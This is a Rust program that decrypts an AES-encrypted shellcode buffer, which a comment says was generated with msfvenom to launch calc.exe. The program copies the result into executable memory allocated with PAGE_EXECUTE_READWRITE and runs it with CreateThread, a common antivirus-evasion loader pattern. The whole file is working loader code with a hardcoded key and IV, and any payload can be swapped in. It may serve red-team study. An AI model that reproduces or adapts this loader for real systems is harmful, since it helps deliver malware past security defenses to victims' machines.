use libaes::Cipher;
use windows::Win32::System::{
    Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
    Threading::{CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS},
};

fn main() {
    // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
    // Encrypted AES
    let buf: [u8; 288] = [
        183, 9, 129, 138, 142, 88, 247, 156, 147, 143, 88, 247, 154, 101, 185, 241, 196, 37, 81,
        252, 150, 90, 25, 59, 187, 138, 117, 18, 37, 69, 127, 125, 117, 3, 142, 222, 101, 91, 41,
        40, 91, 45, 110, 142, 171, 226, 111, 70, 244, 112, 199, 93, 223, 130, 150, 175, 220, 117,
        48, 77, 218, 66, 157, 81, 30, 125, 25, 26, 228, 61, 75, 244, 179, 190, 133, 124, 239, 200,
        30, 247, 142, 80, 222, 62, 222, 184, 218, 133, 121, 33, 100, 47, 173, 195, 71, 50, 106, 76,
        199, 27, 230, 193, 248, 227, 252, 138, 0, 188, 146, 159, 251, 71, 251, 156, 156, 94, 59,
        37, 184, 164, 56, 223, 76, 201, 118, 155, 182, 117, 194, 188, 230, 76, 197, 238, 250, 66,
        226, 20, 107, 143, 63, 249, 213, 59, 144, 218, 27, 113, 230, 213, 215, 127, 16, 230, 154,
        229, 143, 73, 186, 18, 173, 151, 202, 224, 190, 92, 95, 185, 214, 196, 253, 101, 228, 3,
        34, 209, 146, 53, 195, 46, 107, 214, 16, 146, 69, 146, 67, 98, 244, 108, 132, 234, 45, 194,
        238, 94, 17, 172, 156, 45, 206, 38, 221, 86, 88, 60, 173, 90, 175, 61, 230, 99, 117, 131,
        121, 84, 3, 254, 159, 185, 245, 220, 165, 244, 16, 51, 222, 32, 222, 13, 237, 85, 60, 230,
        22, 201, 39, 82, 126, 62, 33, 146, 29, 208, 158, 141, 195, 247, 130, 204, 211, 190, 199,
        188, 139, 202, 93, 131, 173, 173, 111, 23, 240, 235, 39, 214, 221, 96, 135, 56, 43, 239,
        222, 181, 196, 205, 96, 17, 156, 225, 222, 217, 210, 40, 130, 103, 208, 11,
    ];

    let key = b"SUPER_SECRET_PASSWORD_IMPOSSIBLE";
    let iv = b"This is 16 bytes";
    let cipher = Cipher::new_256(key);

    // Encryption methods
    // let encrypted = cipher.cbc_encrypt(iv, &buf);

    // println!("{:?}", encrypted);

    let buf = cipher.cbc_decrypt(iv, &buf);
    unsafe {
        let address = VirtualAlloc(
            Some(std::ptr::null()),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        std::ptr::copy(buf.as_ptr(), address as _, buf.len());

        let hthread = CreateThread(
            Some(std::ptr::null()),
            0,
            std::mem::transmute(address),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        )
        .unwrap();

        WaitForSingleObject(hthread, INFINITE);
    }
}
